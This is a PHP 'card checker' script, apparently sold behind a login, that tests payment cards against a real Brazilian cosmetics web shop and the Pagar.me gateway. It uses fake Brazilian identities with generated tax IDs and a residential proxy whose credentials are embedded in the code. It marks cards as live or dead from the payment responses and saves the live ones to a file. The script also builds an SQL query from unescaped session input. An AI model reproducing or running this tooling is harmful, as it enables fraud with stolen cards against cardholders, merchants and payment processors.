<?php
error_reporting(1);
set_time_limit(0);
session_start();
include_once("../../conn.php");
date_default_timezone_set('America/Sao_Paulo');


// Verifica se o usuário está logado
if (!isset($_SESSION['usuario'])) {
    die(json_encode(array("error" => "Acesso negado - Usuário não logado")));
}

// Verifica se o usuário tem validade ativa
$usuario = $_SESSION['usuario'];
$query = mysqli_query($conn, "SELECT validade FROM usuarios WHERE usuario = '$usuario'");
$dados = mysqli_fetch_assoc($query);

if (!$dados || strtotime($dados['validade']) < time()) {
    die(json_encode(array("error" => "Acesso negado - Usuário com acesso expirado")));
}

function capturar($separar, $inicia, $termina){
    return explode($termina, explode($inicia, $separar)[1])[0] ?? null;
}

$cookieFile = __DIR__ . "/autocookies.txt"; 

if (file_exists($cookieFile)) {
    unlink($cookieFile);
}

function saveLive($cc) {
    $file = dirname(__FILE__) . "/Live Cards.txt";
    $fp = fopen($file, "a+");
    fwrite($fp, $cc . PHP_EOL);
    fclose($fp); }

function gerarCPF($numer) {
    for ($i = 0; $i < 9; $i++) {
      $cpf[$i] = mt_rand(0, 9);
    }
  
    $soma = 0;
    for ($i = 0; $i < 9; $i++) {
      $soma += ($cpf[$i] * (10 - $i));
    }
    $resto = $soma % 11;
    $cpf[9] = ($resto < 2) ? 0 : (11 - $resto);
  
    $soma = 0;
    for ($i = 0; $i < 10; $i++) {
      $soma += ($cpf[$i] * (11 - $i));
    }
    $resto = $soma % 11;
    $cpf[10] = ($resto < 2) ? 0 : (11 - $resto);

    $cpf = implode('', $cpf);
    
    if ($numer == 1) {
        return $cpf;
    }else{
        return substr($cpf, 0, 3) . '.' . substr($cpf, 3, 3) . '.' . substr($cpf, 6, 3) . '-' . substr($cpf, 9, 2);
    }
}



function GerarNome() {
    $nomes = [
        "Joao", "Maria", "Pedro", "Ana", "Carlos", "Beatriz", "Fernando", "Juliana", "Lucas", "Camila", 
        "Marcos", "Larissa", "Ricardo", "Patricia", "Roberto", "Vanessa", "Eduardo", "Gabriela", "Alexandre", "Sofia", 
        "Bruno", "Isabela", "Andre", "Rafaela", "Diego", "Fernanda", "Thiago", "Helena", "Leonardo", "Paula", 
        "Felipe", "Clara", "Gustavo", "Lorena", "Samuel", "Luiza", "Victor", "Manuela", "Daniel", "Alice", 
        "Miguel", "Laura", "Rafael", "Bianca", "Enzo", "Valentina", "Mateus", "Yasmin", "Henrique", "Melissa", 
        "Antonio", "Esther", "Marcelo", "Dbora", "Vinicius", "Nicole", "Otavio", "Lara", "Rodrigo", "Eloa", 
        "Murilo", "Sabrina", "Arthur", "Sophia", "Luana", "Eduarda", "Marcos", "Ravi", "Breno", "Matias"
    ];
    return $nomes[array_rand($nomes)];
  }

  function GerarSobrenome() {
    $sobrenomes = [
        "Silva", "Souza", "Oliveira", "Santos", "Pereira", "Costa", "Carvalho", "Almeida", "Ribeiro", "Fernandes", 
        "Lima", "Gomes", "Martins", "Araujo", "Barbosa", "Rocha", "Dias", "Mendes", "Freitas", "Cardoso", 
        "Monteiro", "Correia", "Castro", "Nascimento", "Moreira", "Vieira", "Pinheiro", "Teixeira", "Barros", "Duarte", 
        "Farias", "Andrade", "Cavalcante", "Moura", "Batista", "Pinto", "Macedo", "Lopes", "Miranda", "Nunes"
    ];
    return $sobrenomes[array_rand($sobrenomes)];
  }
  
function GerarEmail($nome,$sobrenome){
    $provedores = ["gmail.com", "yahoo.com", "outlook.com", "hotmail.com", "live.com", "icloud.com"];
    $nome = strtolower($nome);
    $sobrenome = strtolower($sobrenome);
    $rand = rand(10,9999);
    $provedor = $provedores[array_rand($provedores)];
    return $nome . $sobrenome . $rand . '@' . $provedor;
}

$nome = GerarNome();
$sobrenome = GerarSobrenome();
$email = GerarEmail($nome,$sobrenome);
$cpf = gerarCPF($numer);




$lista = $_GET['lista'];
$separarlist = explode('|', $lista); 
$cc = trim($separarlist[0]);
$mes = trim($separarlist[1]);
$ano = trim($separarlist[2]);
$cvv = trim($separarlist[3]);

if ($mes >= 1 && $mes <= 12) {
    $mes2 = (int)$mes; 
} 

$ano2 = (strlen($ano) == 4) ? substr($ano, -2) : $ano;


$proxy = "aus.360s5.com:3600";
$proxyAuth = "57137594-zone-custom-region-US:3XtCaSQe";

 $ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.bioage.com.br/bio-acne-solution-cleanser-120ml');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyAuth);
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language: pt-BR,pt;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6',
    'cache-control: max-age=0',
    'priority: u=0, i',
    'referer: https://www.bioage.com.br/',
    'sec-ch-ua: "Chromium";v="134", "Not:A-Brand";v="24", "Microsoft Edge";v="134"',
    'sec-ch-ua-mobile: ?0',
    'sec-ch-ua-platform: "Windows"',
    'sec-fetch-dest: document',
    'sec-fetch-mode: navigate',
    'sec-fetch-site: same-origin',
    'sec-fetch-user: ?1',
    'upgrade-insecure-requests: 1',
    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0',
]);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookieFile);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookieFile);
$response = curl_exec($ch);
curl_close($ch);

$token_key = capturar($response,'name="form_key" type="hidden" value="','"');

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.bioage.com.br/checkout/cart/add/uenc/aHR0cHM6Ly93d3cuYmlvYWdlLmNvbS5ici9iaW8tYWNuZS1zb2x1dGlvbi1jbGVhbnNlci0xMjBtbA~~/product/410/');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyAuth);
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'Host: www.bioage.com.br',
    'x-newrelic-id: VwIAUF9UDxAJXFhRDwAFX1M=',
    'sec-ch-ua-platform: "Windows"',
    'sec-ch-ua: "Chromium";v="134", "Not:A-Brand";v="24", "Google Chrome";v="134"',
    'newrelic: eyJ2IjpbMCwxXSwiZCI6eyJ0eSI6IkJyb3dzZXIiLCJhYyI6IjM0NzE5NzciLCJhcCI6IjExMjAwNjY2NjIiLCJpZCI6IjVlYzZhZmVkNTRiNzg3M2IiLCJ0ciI6Ijk4YzViOTU2ZjFlOTM3OGI4ZjBiYjc5YWUwNjcxNzYwIiwidGkiOjE3NDE5NjE2MjEwOTgsInRrIjoiMTMyMjg0MCJ9fQ==',
    'sec-ch-ua-mobile: ?0',
    'traceparent: 00-98c5b956f1e9378b8f0bb79ae0671760-5ec6afed54b7873b-01',
    'x-requested-with: XMLHttpRequest',
    'accept: application/json, text/javascript, */*; q=0.01',
    'content-type: multipart/form-data; boundary=----WebKitFormBoundaryt9rCFTmnbCHHaOU7',
    'tracestate: 1322840@nr=0-1-3471977-1120066662-5ec6afed54b7873b----1741961621098',
    'origin: https://www.bioage.com.br',
    'sec-fetch-site: same-origin',
    'sec-fetch-mode: cors',
    'sec-fetch-dest: empty',
    'referer: https://www.bioage.com.br/bio-acne-solution-cleanser-120ml',
    'accept-language: pt-BR,pt-PT;q=0.9,pt;q=0.8,en-US;q=0.7,en;q=0.6',
    'priority: u=1, i',
    'Accept-Encoding: gzip',
]);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookieFile);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookieFile);
curl_setopt($ch, CURLOPT_POSTFIELDS, '------WebKitFormBoundaryt9rCFTmnbCHHaOU7
Content-Disposition: form-data; name="product"

410
------WebKitFormBoundaryt9rCFTmnbCHHaOU7
Content-Disposition: form-data; name="selected_configurable_option"


------WebKitFormBoundaryt9rCFTmnbCHHaOU7
Content-Disposition: form-data; name="related_product"


------WebKitFormBoundaryt9rCFTmnbCHHaOU7
Content-Disposition: form-data; name="item"

410
------WebKitFormBoundaryt9rCFTmnbCHHaOU7
Content-Disposition: form-data; name="form_key"

'.$token_key.'
------WebKitFormBoundaryt9rCFTmnbCHHaOU7
Content-Disposition: form-data; name="qty"

1
------WebKitFormBoundaryt9rCFTmnbCHHaOU7--
');
$pay = curl_exec($ch);
curl_close($ch);




$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.bioage.com.br/checkout/');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyAuth);
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'Host: www.bioage.com.br',
    'sec-ch-ua: "Chromium";v="134", "Not:A-Brand";v="24", "Google Chrome";v="134"',
    'sec-ch-ua-mobile: ?0',
    'sec-ch-ua-platform: "Windows"',
    'upgrade-insecure-requests: 1',
    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',
    'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'sec-fetch-site: same-origin',
    'sec-fetch-mode: navigate',
    'sec-fetch-user: ?1',
    'sec-fetch-dest: document',
    'referer: https://www.bioage.com.br/bio-acne-solution-cleanser-120ml',
    'accept-language: pt-BR,pt-PT;q=0.9,pt;q=0.8,en-US;q=0.7,en;q=0.6',
]);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookieFile);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookieFile);
$response = curl_exec($ch);
curl_close($ch);

$token_card = capturar($response,'"quoteData":{"entity_id":"','"');


$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.bioage.com.br/rest/homecare/V1/guest-carts/'.$token_card.'/estimate-shipping-methods');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyAuth);
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'Host: www.bioage.com.br',
    'x-newrelic-id: VwIAUF9UDxAJXFhRDwAFX1M=',
    'sec-ch-ua-platform: "Windows"',
    'sec-ch-ua: "Chromium";v="134", "Not:A-Brand";v="24", "Google Chrome";v="134"',
    'newrelic: eyJ2IjpbMCwxXSwiZCI6eyJ0eSI6IkJyb3dzZXIiLCJhYyI6IjM0NzE5NzciLCJhcCI6IjExMjAwNjY2NjIiLCJpZCI6IjkwMzJhY2JlM2MyMjJmMjMiLCJ0ciI6ImU3MjcxMjljY2FhYTk4ODJhNzg0MWEyM2I0NDBkNTQ3IiwidGkiOjE3NDE5NjE5NjA3NDYsInRrIjoiMTMyMjg0MCJ9fQ==',
    'sec-ch-ua-mobile: ?0',
    'traceparent: 00-e727129ccaaa9882a7841a23b440d547-9032acbe3c222f23-01',
    'x-requested-with: XMLHttpRequest',
    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',
    'accept: */*',
    'content-type: application/json',
    'tracestate: 1322840@nr=0-1-3471977-1120066662-9032acbe3c222f23----1741961960746',
    'origin: https://www.bioage.com.br',
    'sec-fetch-site: same-origin',
    'sec-fetch-mode: cors',
    'sec-fetch-dest: empty',
    'referer: https://www.bioage.com.br/checkout/',
    'accept-language: pt-BR,pt-PT;q=0.9,pt;q=0.8,en-US;q=0.7,en;q=0.6',
]);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookieFile);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookieFile);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"address":{"street":["","1","qd f lt 12",""],"city":"São Paulo","region_id":"515","region":"São Paulo","country_id":"BR","postcode":"02147-080","firstname":"'.$nome.'","lastname":"'.$sobrenome.'","vat_id":"'.$cpf.'","telephone":"(62) 9920-11258","custom_attributes":[{"attribute_code":"custom_field_1","value":"20/08/1975"}]}}');
$pay = curl_exec($ch);
curl_close($ch);



$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.bioage.com.br/rest/homecare/V1/guest-carts/'.$token_card.'/shipping-information');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyAuth);
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'Host: www.bioage.com.br',
    'x-newrelic-id: VwIAUF9UDxAJXFhRDwAFX1M=',
    'sec-ch-ua-platform: "Windows"',
    'sec-ch-ua: "Chromium";v="134", "Not:A-Brand";v="24", "Google Chrome";v="134"',
    'newrelic: eyJ2IjpbMCwxXSwiZCI6eyJ0eSI6IkJyb3dzZXIiLCJhYyI6IjM0NzE5NzciLCJhcCI6IjExMjAwNjY2NjIiLCJpZCI6IjQ0NmVjMmFjYzYxZTFjNDIiLCJ0ciI6IjM0ODAyNzMxM2ViYTQzYjZmZDJmY2I3N2ZlZjdmZjg3IiwidGkiOjE3NDE5NjE5Njc5MjksInRrIjoiMTMyMjg0MCJ9fQ==',
    'sec-ch-ua-mobile: ?0',
    'traceparent: 00-348027313eba43b6fd2fcb77fef7ff87-446ec2acc61e1c42-01',
    'x-requested-with: XMLHttpRequest',
    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',
    'accept: */*',
    'content-type: application/json',
    'tracestate: 1322840@nr=0-1-3471977-1120066662-446ec2acc61e1c42----1741961967929',
    'origin: https://www.bioage.com.br',
    'referer: https://www.bioage.com.br/checkout/',
    'accept-language: pt-BR,pt-PT;q=0.9,pt;q=0.8,en-US;q=0.7,en;q=0.6',
]);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookieFile);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookieFile);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"addressInformation":{"shipping_address":{"countryId":"BR","regionId":"515","regionCode":"SP","region":"São Paulo","street":["Soldado Bruno Estrifíca","1","qd f lt 12","Parque Novo Mundo"],"telephone":"(62) 9920-11258","postcode":"02147-080","city":"São Paulo","firstname":"'.$nome.'","lastname":"'.$sobrenome.'","vatId":"'.$cpf.'","customAttributes":[{"attribute_code":"custom_field_1","value":"20/08/1975"}]},"billing_address":{"countryId":"BR","regionId":"515","regionCode":"SP","region":"São Paulo","street":["Soldado Bruno Estrifíca","1","qd f lt 12","Parque Novo Mundo"],"telephone":"(62) 9920-11258","postcode":"02147-080","city":"São Paulo","firstname":"'.$nome.'","lastname":"'.$sobrenome.'","vatId":"'.$cpf.'","customAttributes":[{"attribute_code":"custom_field_1","value":"20/08/1975"}],"saveInAddressBook":null},"shipping_method_code":"03220","shipping_carrier_code":"correios","extension_attributes":{}}}');
$and = curl_exec($ch);
curl_close($ch);


$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.pagar.me/core/v5/tokens?appId=pk_275DVJtjqFYEDqvV');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'Host: api.pagar.me',
    'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',
    'Accept: application/json, text/javascript, */*; q=0.01',
    'sec-ch-ua: "Chromium";v="134", "Not:A-Brand";v="24", "Google Chrome";v="134"',
    'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
    'Origin: https://www.bioage.com.br',
    'Referer: https://www.bioage.com.br/',
    'Accept-Language: pt-BR,pt-PT;q=0.9,pt;q=0.8,en-US;q=0.7,en;q=0.6',
]);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card%5Bholder_name%5D='.$nome.'+'.$sobrenome.'&card%5Bnumber%5D='.$cc.'&card%5Bexp_month%5D='.$mes2.'&card%5Bexp_year%5D='.$ano.'&card%5Bcvv%5D='.$cvv.'&card%5Bholder_document%5D=');
$tokensv5 = curl_exec($ch);
curl_close($ch);

$cc_token = capturar($tokensv5,'"id": "','"');
$cc4 = capturar($tokensv5,'"last_four_digits": "','"');


$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.bioage.com.br/rest/homecare/V1/guest-carts/'.$token_card.'/payment-information');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyAuth);
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'Host: www.bioage.com.br',
    'x-newrelic-id: VwIAUF9UDxAJXFhRDwAFX1M=',
    'sec-ch-ua-platform: "Windows"',
    'sec-ch-ua: "Chromium";v="134", "Not:A-Brand";v="24", "Google Chrome";v="134"',
    'newrelic: eyJ2IjpbMCwxXSwiZCI6eyJ0eSI6IkJyb3dzZXIiLCJhYyI6IjM0NzE5NzciLCJhcCI6IjExMjAwNjY2NjIiLCJpZCI6IjIzZDM4MjYyMGIxY2RhMDAiLCJ0ciI6IjhjMWMyOWVkMzk0NDI5ZGI4ZGU5MTA2MTlkMTlhNjI2IiwidGkiOjE3NDE5NjIwMjk5NDMsInRrIjoiMTMyMjg0MCJ9fQ==',
    'sec-ch-ua-mobile: ?0',
    'traceparent: 00-8c1c29ed394429db8de910619d19a626-23d382620b1cda00-01',
    'x-requested-with: XMLHttpRequest',
    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',
    'accept: */*',
    'content-type: application/json',
    'tracestate: 1322840@nr=0-1-3471977-1120066662-23d382620b1cda00----1741962029943',
    'origin: https://www.bioage.com.br',
    'referer: https://www.bioage.com.br/checkout/',
    'accept-language: pt-BR,pt-PT;q=0.9,pt;q=0.8,en-US;q=0.7,en;q=0.6',
]);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookieFile);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookieFile);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"cartId":"'.$token_card.'","billingAddress":{"countryId":"BR","regionId":"515","regionCode":"SP","region":"São Paulo","street":["Soldado Bruno Estrifíca","1","qd f lt 12","Parque Novo Mundo"],"telephone":"(62) 9920-11258","postcode":"02147-080","city":"São Paulo","firstname":"'.$nome.'","lastname":"'.$sobrenome.'","vatId":"'.$cpf.'","customAttributes":[{"attribute_code":"custom_field_1","value":"20/08/1975"}],"saveInAddressBook":null},"paymentMethod":{"method":"pagarme_creditcard","additional_data":{"cc_type":"visa","cc_last_4":"'.$cc4.'","cc_exp_year":"'.$ano.'","cc_exp_month":"'.$mes2.'","cc_owner":"'.$nome.' '.$sobrenome.'","cc_savecard":0,"cc_saved_card":null,"cc_installments":"1","cc_token_credit_card":"'.$cc_token.'","cc_card_tax_amount":"0","cc_buyer_checkbox":false}},"email":"'.$email.'"}');
$pay = curl_exec($ch);
curl_close($ch);

$mm = capturar($pay,'"message":"','"');
$mm1 = capturar($pay,'Por favor revise os dados e tente novamente. -','"');

curl_close($ch);

if(strpos($pay,'C\u00f3digo de seguran\u00e7a inv\u00e1lido') !==false){saveLive("Live: $cc|$mes|$ano2|$cvv {N7 CVV MISMATCH}");
    echo "#LIVE ➜ $cc|$mes|$ano2|$cvv - {N7 CVV MISMATCH} ➜ coder: @authcentergg";
    
}
elseif(strpos($pay,'Fun\u00e7\u00e3o n\u00e3o suportada')!==false){saveLive("Live: $cc|$mes|$ano2|$cvv {12 Success}");
    echo "#LIVE ➜ $cc|$mes|$ano2|$cvv - {12 Success} ➜ coder: @authcentergg";
}
elseif(strpos($pay,'Saldo insuficiente')!==false){saveLive("Live: $cc|$mes|$ano2|$cvv {Insufficient Success}");
    echo "#LIVE ➜ $cc|$mes|$ano2|$cvv - {Insufficient balance} ➜ coder: @authcentergg";
}
else{
    echo "#DIE ➜ $cc|$mes|$ano2|$cvv - {Payment rejected} ➜ coder: @authcentergg";
}
